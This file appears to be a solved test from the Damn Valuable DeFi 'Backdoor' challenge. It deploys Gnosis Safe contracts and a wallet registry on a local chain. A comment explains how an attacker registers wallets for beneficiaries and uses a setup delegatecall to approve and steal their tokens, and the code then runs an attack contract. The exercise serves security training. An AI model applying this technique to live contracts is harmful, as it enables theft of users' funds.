const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
         * EXPLOIT:
         * 
         * During deployment of a new Gnosis proxy wallet,
         * a delegated call can be made that gives an
         * attacker access to the context of the new wallet.
         * 
         * As such an attacker can create a malicous contract that will
         * approve the transfer of all tokens, as this logic is called via a
         * delegateCall, the approval occurs on behalf of the wallet.
         * 
         * As the beneficiaries specified in the walletRegistry have not
         * registered their wallets yet, an attacker can register wallets on
         * their behalf and include the malicous delegateCall during the setup.
         * The attacker specifies the walletRegistry as the destination of the callback
         * during the wallet deployment, causing the walletRegistry to send the DVT tokens
         * to the compromised wallets.
         * 
         * The attacker can then comlete the transfer of the tokens.
         */

        //Deploy attack contract
        this.attackContract = await (
            await ethers.getContractFactory('AttackRegistry', attacker)
        ).deploy(this.walletFactory.address,
            this.walletRegistry.address,
            this.masterCopy.address,
            this.token.address);

        //Begin attack
        await this.attackContract.attack(attacker.address, users, ethers.utils.parseEther("10"));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
